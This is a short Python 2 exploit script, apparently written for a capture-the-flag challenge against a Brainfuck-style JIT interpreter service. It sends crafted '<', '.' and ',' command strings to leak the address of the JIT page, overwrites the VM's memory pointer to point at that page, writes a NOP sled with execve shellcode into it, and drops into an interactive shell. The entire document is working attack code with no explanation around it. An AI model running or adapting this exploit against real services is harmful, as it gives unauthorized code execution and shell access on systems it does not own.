from Pwn import *

p = Pwn(mode=1)

def exploit():
	p.connect()

	p.read_until('>>')

	leak = '<'*40 + '.>.>.>.>.>.'
	p.sendline(leak)

	out = p.read_until('>>')[:-2]
	jit_page = p.unpack(out) - 0x20
	print '[+] JIT Page:',hex(jit_page)

	# raw_input('>')
	# overwrite vm->memory
	ow = '<'*48 + ',>,>,>,>,>,>'
	p.sendline(ow)
	s_bytes = p.pack(jit_page)
	for i in xrange(6):
		p.send(s_bytes[i])

	sc = '\x90'*10 + x86_64().execveSmallShell()
	payload = '>'*11
	payload+= '[' + ',>'*(len(sc))
	payload+= '<'
	payload+= ']'

	# raw_input('>')
	p.read_until('>>')
	p.sendline(payload)
	for i in xrange(len(sc)):
		c = sc[i]
		p.send(c)


	p.io()

exploit()